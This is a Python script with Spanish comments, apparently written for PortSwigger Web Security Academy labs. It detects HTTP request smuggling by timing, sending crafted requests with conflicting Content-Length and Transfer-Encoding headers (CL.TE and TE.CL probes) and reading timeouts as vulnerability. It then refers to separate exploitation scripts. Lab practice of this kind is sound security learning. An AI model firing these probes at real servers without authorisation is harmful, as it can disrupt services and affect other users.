#!/usr/bin/env python3
"""
HTTP Request Smuggling  ->  DETECTOR por timing (CL.TE / TE.CL)
===============================================================
Tecnica oficial de PortSwigger: se envia un cuerpo "ambiguo" a proposito.
Si el servidor es vulnerable, uno de sus componentes (front-end o back-end)
se queda ESPERANDO bytes que nunca llegan  ->  TIMEOUT.
Si responde rapido, NO es vulnerable a esa variante.

  - Sonda CL.TE:
        Content-Length: 4
        Transfer-Encoding: chunked
        cuerpo: "1\r\nA\r\nX"
    Si es CL.TE: el front-end (CL=4) reenvia solo "1\r\nA". El back-end (TE)
    ve un chunk de tamano 1 y se queda esperando el chunk final "0" -> se cuelga.

  - Sonda TE.CL:
        Content-Length: 6
        Transfer-Encoding: chunked
        cuerpo: "0\r\n\r\nX"
    Si es TE.CL: el front-end (TE) corta en "0\r\n\r\n" y descarta la X.
    El back-end (CL=6) espera 6 bytes, recibe menos -> se cuelga.

IMPORTANTE:
  - Se prueba CL.TE PRIMERO (recomendacion de PortSwigger): si el sitio es
    vulnerable a una variante, sondear la otra podria afectar a otros usuarios.
  - Es una prueba de TIMING: si tarda >= UMBRAL segundos, es "vulnerable".
  - Corre siempre una linea base primero para descartar que el server sea lento.

Uso:
    python detect.py
Cambia HOST / PORT / USE_TLS abajo.
"""
import socket
import ssl
import time

HOST = "TU-LAB-ID.web-security-academy.net"  # <-- cambia por tu lab
PORT = 443
USE_TLS = True          # True para HTTPS, False para HTTP

SOCK_TIMEOUT = 12       # timeout del socket (debe ser MAYOR que UMBRAL)
UMBRAL = 5.0            # segundos; si tarda >= esto -> se considera vulnerable


def timed_send(host: str, port: int, raw: bytes, use_tls: bool,
               timeout: float) -> float:
    """Envia los bytes y devuelve cuantos segundos tardo en llegar la respuesta
    (o en agotarse el timeout). Ese tiempo es la senal que nos interesa."""
    sock = socket.create_connection((host, port), timeout=timeout)
    if use_tls:
        ctx = ssl.create_default_context()
        # Labs con certificados raros:
        # ctx.check_hostname = False
        # ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    start = time.perf_counter()
    try:
        sock.sendall(raw)
        try:
            data = sock.recv(4096)   # esperamos el PRIMER byte de respuesta
            # si recv devuelve vacio de inmediato tambien cuenta como "rapido"
            _ = data
        except socket.timeout:
            pass                     # se colgo: el tiempo cuenta hasta el timeout
        return time.perf_counter() - start
    finally:
        sock.close()


def build(headers_extra: str, body: str) -> bytes:
    """Arma la peticion cruda. body ya lleva sus \\r\\n exactos."""
    return (
        "POST / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"{headers_extra}"
        "\r\n"
        f"{body}"
    ).encode("latin-1")


# --- Peticiones ------------------------------------------------------------

# Linea base: peticion normal y bien formada. Debe responder RAPIDO.
BASELINE = build(
    "Content-Length: 5\r\n",
    "x=abc",
)

# Sonda CL.TE
PROBE_CL_TE = build(
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n",
    "1\r\nA\r\nX",
)

# Sonda TE.CL
PROBE_TE_CL = build(
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n",
    "0\r\n\r\nX",
)


def run_probe(nombre: str, raw: bytes, base: float) -> bool:
    t = timed_send(HOST, PORT, raw, USE_TLS, SOCK_TIMEOUT)
    vulnerable = t >= UMBRAL
    marca = "  <-- SE COLGO (timeout)" if vulnerable else ""
    print(f"    {nombre:8s}: {t:6.2f}s (base {base:.2f}s){marca}")
    return vulnerable


if __name__ == "__main__":
    print(f"[*] Detector de smuggling  ->  {HOST}:{PORT} (TLS={USE_TLS})")
    print(f"[*] Umbral de deteccion: {UMBRAL:.1f}s\n")

    print("[1] Linea base (deberia ser rapida)...")
    base = timed_send(HOST, PORT, BASELINE, USE_TLS, SOCK_TIMEOUT)
    print(f"    baseline: {base:6.2f}s\n")

    if base >= UMBRAL:
        print("[!] La linea base ya es lenta. El server responde lento por si"
              " mismo; sube UMBRAL/SOCK_TIMEOUT o el resultado sera dudoso.\n")

    # PortSwigger: probar CL.TE primero.
    print("[2] Probando variantes (una peticion cada una)...")
    cl_te = run_probe("CL.TE", PROBE_CL_TE, base)
    te_cl = run_probe("TE.CL", PROBE_TE_CL, base)

    print("\n" + "=" * 50)
    if cl_te and te_cl:
        print(">> AMBAS sondas se colgaron. Probable desincronizacion, pero")
        print("   revisa a mano cual explota (a veces una es falso positivo).")
    elif cl_te:
        print(">> VULNERABLE a  CL.TE  (front-end: Content-Length /"
              " back-end: Transfer-Encoding)")
        print("   Usa el script  cl_te.py  para explotarlo.")
    elif te_cl:
        print(">> VULNERABLE a  TE.CL  (front-end: Transfer-Encoding /"
              " back-end: Content-Length)")
        print("   Usa el script  te_cl.py  para explotarlo.")
    else:
        print(">> NO se detecto smuggling por timing (ninguna sonda se colgo).")
        print("   Puede no ser vulnerable, o usar otra variante (TE.TE, etc).")
    print("=" * 50)
